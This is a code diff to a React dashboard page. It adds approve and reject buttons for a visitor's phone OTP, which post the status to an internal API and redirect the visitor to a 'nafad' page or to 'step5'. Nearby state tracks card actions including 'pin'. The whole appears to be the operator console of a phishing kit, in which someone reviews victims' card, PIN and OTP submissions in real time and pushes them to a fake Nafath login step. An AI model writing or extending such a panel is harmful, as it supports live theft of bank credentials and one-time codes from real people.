@@ -101,6 +101,7 @@ export default function DashboardPage() {
   const [currentTime, setCurrentTime] = useState(Date.now());
   const [openLogBox, setOpenLogBox] = useState<string | null>(null);
   const [cardActionStatus, setCardActionStatus] = useState<"approved" | "rejected" | "pin" | null>(null);
+  const [phoneActionStatus, setPhoneActionStatus] = useState<"approved" | "rejected" | null>(null);
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
@@ -3526,14 +3527,64 @@ const renderNafadBox = () => {
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 ⏳ في انتظار المراجعة فقط
               </div>
-              {showPhoneDecisionButtons && (
+              {showPhoneDecisionButtons && !phoneActionStatus && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
-                  <button onClick={() => handleLocalPhoneAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                  <button onClick={async () => { 
+                    setActionLoading("phone");
+                    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                    if (visitorId) {
+                      await fetch("/api/dashboard/reflect-status", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ visitorId, field: "phoneOtpStatus", status: "approved" }),
+                      });
+                      await fetch("/api/dashboard/redirect", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ visitorId, targetPage: "nafad" }),
+                      });
+                    }
+                    setPhoneActionStatus("approved");
+                    setActionLoading(null);
+                  }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     موافقة
                   </button>
-                  <button onClick={() => handleLocalPhoneAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                  <button onClick={async () => { 
+                    setActionLoading("phone");
+                    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                    if (visitorId) {
+                      await fetch("/api/dashboard/reflect-status", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ visitorId, field: "phoneOtpStatus", status: "rejected" }),
+                      });
+                      await fetch("/api/dashboard/redirect", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ visitorId, targetPage: "step5" }),
+                      });
+                    }
+                    setPhoneActionStatus("rejected");
+                    setActionLoading(null);
+                  }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     رفض
                   </button>
+                </div>
+              )}
+              {phoneActionStatus && (
+                <div style={{ 
+                  display: "flex", 
+                  justifyContent: "center", 
+                  marginTop: 10,
+                  padding: "8px 12px",
+                  borderRadius: 8,
+                  background: phoneActionStatus === "approved" ? "#dcfce7" : "#fee2e2",
+                  color: phoneActionStatus === "approved" ? "#166534" : "#991b1b",
+                  fontWeight: 600,
+                  fontSize: "0.9rem"
+                }}>
+                  {phoneActionStatus === "approved" && "✓ تمت الموافقة"}
+                  {phoneActionStatus === "rejected" && "✗ تم رفض رقم الهاتف"}
                 </div>
               )}
             </div>
